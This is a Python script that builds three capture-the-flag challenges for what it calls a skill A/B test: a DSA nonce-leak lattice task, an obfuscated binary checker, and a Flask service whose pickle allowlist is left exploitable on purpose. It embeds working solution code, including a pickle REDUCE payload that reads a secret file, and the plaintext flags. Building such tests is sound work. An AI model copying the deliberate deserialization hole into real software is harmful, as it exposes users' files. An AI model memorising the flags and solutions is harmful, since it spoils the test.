#!/usr/bin/env python3
"""Generate boss-level challenges for the skill A/B test.

Runs INSIDE the ctf-sandbox container (needs gcc, sympy, sage for verification):

  docker run --rm -v <repo>:/work ctf-sandbox \
      python3 /work/scripts/gen_hard3.py

Output: challenges/hard3/<name>/{metadata.yml, distfiles/...}
"""

from __future__ import annotations

import hashlib
import random
import shutil
import subprocess
import sys
from pathlib import Path

ROOT = Path("/work") if Path("/work").exists() else Path(__file__).resolve().parent.parent
OUT = ROOT / "challenges" / "hard3"

random.seed(20261021)


def _w(path: Path, data) -> None:
    path.parent.mkdir(parents=True, exist_ok=True)
    if isinstance(data, bytes):
        path.write_bytes(data)
    else:
        path.write_text(data, encoding="utf-8")


def _meta(ch_dir: Path, name: str, category: str, value: int, desc: str, flag: str) -> None:
    _w(ch_dir / "metadata.yml", (
        f"name: {name}\n"
        f"category: {category}\n"
        f"value: {value}\n"
        f"description: |\n"
        + "".join(f"  {line}\n" for line in desc.strip().splitlines())
        + f"flag: {flag!r}\n"
    ))


def _clean(ch_dir: Path) -> None:
    if ch_dir.exists():
        shutil.rmtree(ch_dir)
    (ch_dir / "distfiles").mkdir(parents=True)


def _c_array(name: str, data: bytes) -> str:
    return f"static const unsigned char {name}[] = {{" + ", ".join(str(b) for b in data) + "};"


# ------------------------------------------------------------------ crypto ----

def gen_crypto_hnp() -> None:
    """DSA with the TOP half of every 256-bit nonce leaked → Hidden Number Problem.

    flag = flag{md5(private_key)[:20]} — no static shortcut exists.
    """
    import sympy

    ch = OUT / "crypto-hnp"
    _clean(ch)

    q = int(sympy.randprime(2**255, 2**256))           # 256-bit subgroup order
    p = int(sympy.randprime(2**1023, 2**1024))         # prime field
    g = 5
    x = random.randrange(1, q)                          # private key
    y = pow(g, x, p)

    prefix = 0xDEADBEEFCAFEBABE1234567890AB << 128      # known top 128 bits of each nonce
    sigs = []
    for i in range(6):
        k = prefix | random.getrandbits(128)
        h = int(hashlib.sha256(f"message {i}".encode()).hexdigest(), 16) % q
        r = pow(g, k, p) % q
        s = (pow(k, -1, q) * (h + x * r)) % q
        sigs.append((h, r, s))

    flag = "flag{" + hashlib.md5(str(x).encode()).hexdigest()[:20] + "}"
    lines = [f"p = {p}", f"q = {q}", f"g = {g}", f"y = {y}",
             f"nonce_prefix_high128 = {prefix >> 128}",
             "# each nonce = (nonce_prefix_high128 << 128) | low128(unknown)",
             "# signatures: (h, r, s)"]
    for h, r, s in sigs:
        lines.append(f"({h}, {r}, {s})")
    _w(ch / "distfiles" / "dsa.txt", "\n".join(lines) + "\n")
    _meta(ch, "reg3-crypto-hnp", "crypto", 500,
          "DSA signatures over GF(p) with subgroup order q. Every signing nonce shares\n"
          "the same known TOP 128 bits (see nonce_prefix_high128). Recover the private\n"
          "key x; the flag is flag{md5(x)[:20]}.",
          flag)

    # verify with jvdsn's lattice attack
    verify = r'''
import sys, hashlib
sys.path.insert(1, "/opt/crypto-attacks")
from attacks.hnp import lattice_attack
from shared.partial_integer import PartialInteger
import re
t = open("/work/challenges/hard3/crypto-hnp/distfiles/dsa.txt").read()
g = lambda n: int(re.search(rf"^{n} = (\d+)$", t, re.M).group(1))
p, q = g("p"), g("q")
prefix = g("nonce_prefix_high128")
sigs = re.findall(r"\((\d+), (\d+), (\d+)\)", t)
h = [int(a) for a, _, _ in sigs]; r = [int(b) for _, b, _ in sigs]; s = [int(c) for _, _, c in sigs]
pk = [PartialInteger.msb_of(prefix << 128, 256, 128) for _ in sigs]
for x_, ks in lattice_attack.dsa_known_msb(q, h, r, s, pk):
    print("x recovered:", x_ is not None)
    if x_:
        import hashlib
        print("flag{", hashlib.md5(str(x_).encode()).hexdigest()[:20], "}", sep="")
    break
'''
    r = subprocess.run(["/opt/miniforge3/bin/python", "-c", verify], capture_output=True, text=True, timeout=300)
    out = (r.stdout + r.stderr).strip()
    ok = hashlib.md5(str(x).encode()).hexdigest()[:20] in out
    print(f"[gen-hard3] hnp self-check: {'OK' if ok else 'FAIL'}")
    if not ok:
        print(out[-800:])
        raise SystemExit("hnp self-check failed")


# ----------------------------------------------------------------- reverse ----

def gen_reverse_mba() -> None:
    """MBA-obfuscated per-character constraint checker.

    Each character must satisfy an independent MBA-rewritten equation with a
    UNIQUE byte solution (verified at generation time). Solvable via z3 or by
    recognizing/simplifying the MBA identities — hard to brute-force by hand.
    """
    ch = OUT / "reverse-mba"
    _clean(ch)
    flag = "flag{mb4_0bfusc4t10n_bust3r}"

    # Per-position: enc[i] = ((c ^ k1) + ((c & k2) << 1) - (c | k3)) & 0xFF
    # Verify uniqueness per position (retry constants until unique).
    rows = []
    for i, c in enumerate(flag.encode()):
        while True:
            k1 = random.randrange(1, 256)
            k2 = random.randrange(1, 256)
            k3 = random.randrange(1, 256)
            enc = ((c ^ k1) + ((c & k2) << 1) - (c | k3)) & 0xFF
            sols = [x for x in range(256)
                    if ((x ^ k1) + ((x & k2) << 1) - (x | k3)) & 0xFF == enc]
            if sols == [c]:
                rows.append((i, k1, k2, k3, enc))
                break

    tbl = ", ".join(f"{{{k1},{k2},{k3},{enc}}}" for _, k1, k2, k3, enc in rows)
    n = len(rows)
    src = f"""#include <stdio.h>
#include <string.h>

static const unsigned char TBL[{n}][4] = {{{tbl}}};

int main(int argc, char **argv) {{
    if (argc < 2) {{ puts("usage: ./check <flag>"); return 1; }}
    const unsigned char *in = (const unsigned char *)argv[1];
    if (strlen((const char *)in) != {n}) {{ puts("wrong"); return 0; }}
    for (size_t i = 0; i < {n}; i++) {{
        unsigned int c = in[i];
        unsigned int k1 = TBL[i][0], k2 = TBL[i][1], k3 = TBL[i][2], e = TBL[i][3];
        /* obfuscated per-char constraint, written via MBA identities */
        unsigned int a = ((c ^ k1) & 0xFF) + ((((c & k2) << 1) & 0x1FE));
        unsigned int b = (c | k3) & 0xFF;
        unsigned int v = (a - b) & 0xFF;
        /* extra MBA noise layers (they cancel out): (v|0xAA)+(v&0xAA) == v+0xAA */
        if ((((v | 0xAA) + (v & 0xAA)) & 0xFF) != ((v + 0xAA) & 0xFF)) {{ puts("wrong"); return 0; }}
        if (v != e) {{ puts("wrong"); return 0; }}
    }}
    puts("correct!");
    return 0;
}}
"""
    _w(ch / "build" / "check.c", src)
    subprocess.run(
        ["gcc", "-O2", "-s", "-o", str(ch / "distfiles" / "check"), str(ch / "build" / "check.c")],
        check=True,
    )
    _meta(ch, "reg3-reverse-mba", "reverse", 400,
          "check verifies the flag through per-character constraints written with\n"
          "mixed boolean-arithmetic identities. The binary is stripped.\n"
          f"Recover the flag (length {len(flag)} chars).",
          flag)

    # self-check
    r = subprocess.run([str(ch / "distfiles" / "check"), flag], capture_output=True, text=True)
    ok = "correct!" in r.stdout
    print(f"[gen-hard3] reverse-mba self-check: {'OK' if ok else 'FAIL'}")
    if not ok:
        raise SystemExit("reverse-mba self-check failed")


# --------------------------------------------------------------------- web ----

def gen_web_pickle_restricted() -> None:
    """Restricted unpickler whose allowlist accidentally exposes a file-read
    helper — exploit by hand-crafting pickle opcodes (REDUCE on the helper)."""
    ch = OUT / "web-pickle-restricted"
    _clean(ch)
    flag = "flag{p1ckl3_0pc0d3_ch41n}"
    app_py = '''import base64
import io
import os
import pickle

from flask import Flask, request

app = Flask(__name__)

# The developer allowed scalar types plus their own fileutil.read_file helper.
ALLOWED = {
    "builtins.str", "builtins.int", "builtins.float",
    "builtins.list", "builtins.dict",
    "fileutil.read_file",
}


class RestrictedUnpickler(pickle.Unpickler):
    def find_class(self, module, name):
        full = f"{module}.{name}"
        if full in ALLOWED:
            return super().find_class(module, name)
        raise pickle.UnpicklingError(f"blocked: {full}")


@app.route("/load", methods=["POST"])
def load():
    data = base64.b64decode(request.form["data"])
    try:
        obj = RestrictedUnpickler(io.BytesIO(data)).load()
        return f"loaded: {str(obj)[:200]}"
    except Exception as e:
        return f"error: {e}"


@app.route("/")
def index():
    return "POST base64 pickle to /load"


if __name__ == "__main__":
    app.run(host="127.0.0.1", port=5000)
'''
    fileutil_py = '''"""Internal helpers."""

import os


def read_file(path):
    """Read a file relative to the app directory (used by template loading)."""
    base = os.path.dirname(os.path.abspath(__file__))
    with open(os.path.join(base, path)) as f:
        return f.read()
'''
    _w(ch / "distfiles" / "app.py", app_py)
    _w(ch / "distfiles" / "fileutil.py", fileutil_py)
    _w(ch / "distfiles" / "secret.txt", f"db backup — do not ship\nflag = {flag}\n")
    _meta(ch, "reg3-web-pickle-restricted", "web", 400,
          "A Flask service unpickles user data with an allowlist that, besides scalar\n"
          "builtins, also exposes the app's own fileutil.read_file helper.\n"
          "Run it locally (`cd /challenge/distfiles && python3 app.py &`), craft a pickle\n"
          "that calls the helper on ../secret.txt style paths, and extract the flag.",
          flag)

    # self-check: hand-crafted REDUCE pickle must call fileutil.read_file and win
    dist = str(ch / "distfiles")
    exploit = f'''
import io, pickle, sys
sys.path.insert(0, {dist!r})
# build payload: fileutil.read_file("secret.txt") via REDUCE opcode
payload = b"cfileutil\\nread_file\\n(S'secret.txt'\\ntR."
ALLOWED = {{"builtins.str", "builtins.int", "builtins.float", "builtins.list", "builtins.dict", "fileutil.read_file"}}
class RU(pickle.Unpickler):
    def find_class(self, module, name):
        full = f"{{module}}.{{name}}"
        if full in ALLOWED:
            return super().find_class(module, name)
        raise pickle.UnpicklingError(f"blocked: {{full}}")
try:
    out = RU(io.BytesIO(payload)).load()
    print("RCE result:", out)
except Exception as e:
    print("self-check error:", e)
'''
    r = subprocess.run([sys.executable, "-c", exploit], capture_output=True, text=True, timeout=60,
                       cwd=str(ch / "distfiles"))
    out = (r.stdout + r.stderr).strip()
    ok = flag in out
    print(f"[gen-hard3] pickle self-check: {'OK' if ok else 'FAIL'}")
    if not ok:
        print(out[-600:])
        raise SystemExit("pickle self-check failed")


# ------------------------------------------------------------------ driver ----

def main() -> None:
    print(f"[gen-hard3] output → {OUT}")
    gens = [gen_crypto_hnp, gen_reverse_mba, gen_web_pickle_restricted]
    for g in gens:
        g()
        print(f"[gen-hard3]   ✓ {g.__name__}")
    print(f"[gen-hard3] done: {len(gens)} challenges")


if __name__ == "__main__":
    main()
